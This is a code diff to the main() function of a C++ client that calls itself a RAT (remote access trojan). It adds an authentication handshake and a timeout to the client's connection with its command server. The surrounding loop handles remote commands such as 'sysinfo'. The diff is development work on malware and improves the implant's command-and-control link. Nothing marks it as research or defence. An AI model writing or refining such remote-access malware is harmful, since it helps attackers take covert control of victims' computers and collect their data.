@@ -3552,13 +3552,29 @@ int main()
             continue;
         }
 
-        std::cout << "Connected to server successfully!" << std::endl;
-        connected_successfully = true;
+        std::cout << "TCP connection established, validating with server..." << std::endl;
+        // Don't set connected_successfully = true yet, wait for authentication
+        
+        // Initial authentication flag - will be set to true only after successful auth
+        bool authentication_pending = true;
+        connected_successfully = false;
+        
+        // Set authentication timeout (10 seconds)
+        time_t auth_start_time = time(NULL);
+        const int AUTH_TIMEOUT = 10;
 
         // Command processing loop with enhanced error handling
-        while (connected_successfully)
+        while (authentication_pending || connected_successfully)
         {
             memset(buffer, 0, BUFFER_SIZE);
+            
+            // Check authentication timeout
+            if (authentication_pending && (time(NULL) - auth_start_time) > AUTH_TIMEOUT) {
+                std::cout << "\u274c Authentication timeout! Server may not be a RAT server." << std::endl;
+                connected_successfully = false;
+                authentication_pending = false;
+                break;
+            }
             
             // Check connection health periodically
             if (!is_socket_connected(sock)) {
@@ -3600,7 +3616,33 @@ int main()
                     connected_successfully = false;
                     break;
                 }
-                std::cout << "Authentication key sent to server" << std::endl;
+                std::cout << "Authentication key sent to server, waiting for confirmation..." << std::endl;
+                
+                // Wait for authentication confirmation from server
+                memset(buffer, 0, BUFFER_SIZE);
+                int auth_response = safe_recv(sock, buffer, BUFFER_SIZE - 1);
+                if (auth_response <= 0) {
+                    std::cout << "Failed to receive authentication confirmation" << std::endl;
+                    connected_successfully = false;
+                    break;
+                }
+                
+                buffer[auth_response] = '\0';
+                if (strcmp(buffer, "AUTH_SUCCESS") == 0) {
+                    std::cout << "\u2705 Authentication successful! Connected to RAT server." << std::endl;
+                    connected_successfully = true;
+                    authentication_pending = false;
+                } else if (strcmp(buffer, "AUTH_FAILED") == 0) {
+                    std::cout << "\u274c Authentication failed! Invalid key or server rejected connection." << std::endl;
+                    connected_successfully = false;
+                    authentication_pending = false;
+                    break;
+                } else {
+                    std::cout << "\u274c Unexpected response from server: " << buffer << std::endl;
+                    connected_successfully = false;
+                    authentication_pending = false;
+                    break;
+                }
             }
             else if (strcmp(buffer, "sysinfo") == 0)
             {
